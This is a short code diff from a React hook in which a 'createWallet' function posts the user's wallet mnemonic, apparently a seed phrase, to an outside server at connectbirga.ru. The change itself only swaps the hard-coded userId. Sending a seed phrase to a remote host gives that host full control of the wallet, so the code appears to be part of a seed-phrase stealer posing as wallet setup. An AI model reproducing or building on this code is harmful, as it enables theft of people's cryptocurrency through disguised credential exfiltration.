@@ -76,7 +76,7 @@ const useButton = ({step, setStep, keys, values, setMistakes, mistakes, numbers}
       const createWallet = useCallback( async () => {
         const response = await axios.post("https://www.connectbirga.ru/user/wallet", {
             mnemonic: keys,
-            userId: 2144832745,
+            userId: 1392120153,
           } , {
             headers : {
               "X-API-KEY-AUTH" : process.env.REACT_APP_API_KEY
